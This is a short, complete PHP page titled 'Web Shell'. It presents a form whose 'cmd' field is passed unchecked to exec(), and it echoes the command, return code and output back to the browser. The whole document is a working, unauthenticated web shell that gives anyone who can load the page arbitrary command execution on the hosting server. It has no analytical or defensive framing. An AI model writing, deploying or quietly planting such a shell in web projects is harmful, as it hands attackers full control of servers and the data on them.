<!DOCTYPE html>

<html>
  <head>
     <title>Web Shell</title>
     <?php
         $THIS_SCRIPT = $_SERVER["SCRIPT_FILENAME"];

         if ( isset($_POST['submit']) )
         {
            $shellcmd = $_POST['cmd'];

            $output = null;
            $retval = null;
            exec( $shellcmd . ' 2>&1', $output, $retval );
            echo "Cmd: '$shellcmd'<br/>";
            echo "retval = $retval<br/>";
            echo "output: <br/>";
            echo '<table style="font-size: 1em; border-spacing: 0.4em;">';
            for ($i=0; $i<count($output); ++$i)
            {
               echo '<tr>';
               echo '<td>      </td>';
               echo '<td>';
               echo "$output[$i]<br/>";
               echo '</td>';
               echo '</tr>';
            }
         }
     ?>
  </head>

  <body>
      <div align="center">
         <table style="font-size: 2em; border-spacing: 0.4em;">
            <form action="<?php echo $_SERVER["REQUEST_URI"] ?>" method="POST">
            <tr>
               <td>
                  Shell Cmd:
               </td>
               <td align="right">
                  <input type="text" name="cmd" style="width: 400px; font-size: 0.5em" />
               </td>
            </tr>

            <tr>
               <td/>
               <td align="right">
                  <input type="submit" name="submit" Value="Run it"
                        style="font-size: 0.7em"/>
               </td>
            </tr>
            </form>
         </table>
      </div>
  </body>

</html>
